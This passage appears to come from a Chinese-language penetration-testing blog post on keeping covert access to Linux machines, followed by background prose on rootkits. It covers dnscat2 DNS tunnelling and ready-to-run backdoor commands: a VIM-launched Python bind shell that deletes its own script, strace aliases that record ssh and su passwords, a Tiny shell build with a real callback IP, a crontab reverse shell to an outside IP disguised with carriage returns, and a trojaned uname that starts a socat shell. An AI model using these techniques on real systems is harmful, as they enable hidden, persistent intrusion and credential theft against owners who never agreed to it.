    #
    # See LICENSE.md
    source 'https://gems.ruby-china.com/'
    gem 'trollop' # Commandline parsing
    gem 'salsa20' # Encrypted connections
    gem 'sha3'    # Message signing + key derivation
    gem 'ecdsa'   # Used for ECDH key exchange
    $ gem install bundler
    $ bundle install
启动这玩意。
    sudo ruby dnscat2.rb --dns "domain=attck.me,host=192.168.123.192" --no-cache
然后把控制端编译好，直接make
    ./dnscat --dns server=192.168.123.192
这边主机运行
    session -i 1
我来抓包看看怎么通信的。
所有命令将通过DNS流量传输
我们试下powershell版本的dnscat：  
    Start-Dnscat2 -Domain attck.me -DNSServer 192.168.123.192
已经上线了  
然后新开一个交互式shell
**结论**  
使用dnscat2有各种优点：  
支持多个会话  
流量加密  
使用密钥保护MiTM攻击  
直接从内存运行PowerShell脚本
## VIM后门
先构造一个恶意脚本  
wing.py
    from socket import *
    import subprocess
    import os, threading, sys, time
    if __name__ == "__main__":
            server=socket(AF_INET,SOCK_STREAM)
            server.bind(('0.0.0.0',666))
            server.listen(5)
            print 'waiting for connect'
            talk, addr = server.accept()
            print 'connect from',addr
            proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                    stdout=talk, stderr=talk, shell=True)
前提条件就是VIM安装了python扩展,默认安装的话都有python扩展.
脚本可以放到python的扩展目录
    $(nohup vim -E -c "py3file wing.py"> /dev/null 2>&1 &) && sleep 2 && rm -f wing.py
在后台看得到vim的进程,但是看不到python的进程.
原理参考:
## PAM后门
PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。
它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。
项目地址:  
这是一个自动化脚本
比较适用于centos,测试环境是ubuntu,暂时不复现.
## \r后门
    echo -e "\r" >/var/www/html/wing.php
加了`-e \r`参数之后直接查看源码,只显示后半部分
## strace后门
strace常用来跟踪进程执行时的系统调用和所接收的信号。
在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通
过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。
    ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
     -e read,write,connect  -s2048 ssh'
这个也类似于alias后门
docker测试的时候加 --privileged参数
同理可以记录其他命令
    su='strace   -o   /tmp/sulog-`date    '+%d%h%m%s'`.log  \
     -e read,write,connect  -s2048 su'
## Tiny shell
项目地址:
在linux下编译
    ./compile.sh linux 149.129.72.186 1234 wing 22
参数代表的意思如下
    usage:
    compile.sh os BC_HOST BC_PORT [PASSWORD] [BC_DELAY]
    compile.sh os 8.8.8.8 8081
    compile.sh os 8.8.8.8 8081 mypassword 60
    Please specify one of these targets:
        compile.sh linux
        compile.sh freebsd
        compile.sh openbsd
        compile.sh netbsd
        compile.sh cygwin
        compile.sh sunos
        compile.sh irix
        compile.sh hpux
        compile.sh osf
成功以后会生成tsh和tshd文件  
分别表示控制端和服务端  
在目标上运行
    umask 077; HOME=/var/tmp ./tshd
在攻击机器上运行
    tsh targetip
可以得到一个shell.  
除此之外,还可以上传和下载文件.
反弹的形式
## 浏览器插件后门
项目地址:
我花了很多时间来测试这个项目,目前还没成功,不知道是不是浏览器有限制.
## Local Job Scheduling
### crontab
测试环境:mac  
定时反弹shell
    (crontab -l;printf "*/1 * * * * /usr/bin/nc 30.157.170.75 1389 /bin/sh;\rno crontab for `whoami`%100c\n")|crontab -
## other backdoor
项目地址:  
一些进程隐藏技术,然后反弹shell.
用uname做一个演示
uname.sh
    #uname
    #-------------------------    touch /usr/local/bin/uname
    cat > /usr/local/bin/uname
    #!/bin/bash
    #nc.traditional -l -v -p 4444 -e /bin/bash 2>/dev/null &
    #socat TCP4-Listen:3177,fork EXEC:/bin/bash 2>/dev/null &
    socat SCTP-Listen:1177,fork EXEC:/bin/bash 2>/dev/null &
    #perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=;print $c `$_`;}' 2>/dev/null &
    /bin/uname \$@
    EOF
里面的反弹shell命令自己替换  
## 0x03 Rookit
### Rookit是什么
在悬念迭起的中外谍战片里，对战双方中的一派势力通常会派遣特工人员潜伏到对手阵营中。这名卧底人员良好的伪装使得对手对此长时间毫无察觉；为了能够长期潜伏他不贸然采取高风险行为以免过早暴露自己；他赢得敌人的信任并因此身居要职，这使得他能够源源不断地获取重要情报并利用其独特渠道传送回去。
从某种意义上说这位不速之客就是Rootkit——持久并毫无察觉地驻留在目标计算机中，对系统进行操纵、并通过隐秘渠道收集数据的程序。Rootkit的三要素就是：隐藏、操纵、收集数据。
“Rootkit”中root术语来自于unix领域。由于unix主机系统管理员账号为root账号，该账号拥有最小的安全限制，完全控制主机并拥有了管理员权限被称为“root”了这台电脑。然而能够“root”一台主机并不意味着能持续地控制它，因为管理员完全可能发现了主机遭受入侵并采取清理措施。因此Rootkit的初始含义就在于“能维持root权限的一套工具”。
简单地说，Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。
一个典型rootkit包括：
  * 1 以太网嗅探器程序，用于获得网络上传输的用户名和密码等信息。
  * 2 特洛伊木马程序，例如：inetd或者login，为攻击者提供后门。
  * 3 隐藏攻击者的目录和进程的程序，例如：ps、netstat、rshd和ls等。
  * 4 可能还包括一些日志清理工具，例如：zap、zap2或者z2，攻击者使用这些清理工具删除wtmp、utmp和lastlog等日志文件中有关自己行踪的条目。
  * 一些复杂的rootkit还可以向攻击者提供telnet、shell和finger等服务。
### 应用级rootkit
应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。  
应用级的比较容易清掉,最麻烦的是内核级和硬件级的.
### 内核级rookit
通过加载内核模块的方式来加载后门，比较复杂。一般内核后门都是针对操作系统而言的，不同的操作系统内核模块设置编写方法都不一样，一般不通用。内核后门一般无法通过md5校验等来判断，所有基本比较难发现，目前针对内核后门比较多的是Linux和Solaris下。
### 硬件级后门
这个就是厂商的板子里面就有后门,比如cpu处理器,主板,鼠标,等等.  
demo:我找的这个是应该是内核rookit的例子,其他经典内核的可以看下这两个:
### Reptile
测试环境:kali
项目地址:
安装:
emmmm  
环境炸了.kali得重装  
使用教程参考如下  
>
> 最后有一说一,Linux的rookit我没研究过,文章是去年总结的,就先这样吧,Linux的权限维持我觉得还是比较常用的,Windows的写了一半,然后发现太多了,参考Pentest.blog学习吧!
> XD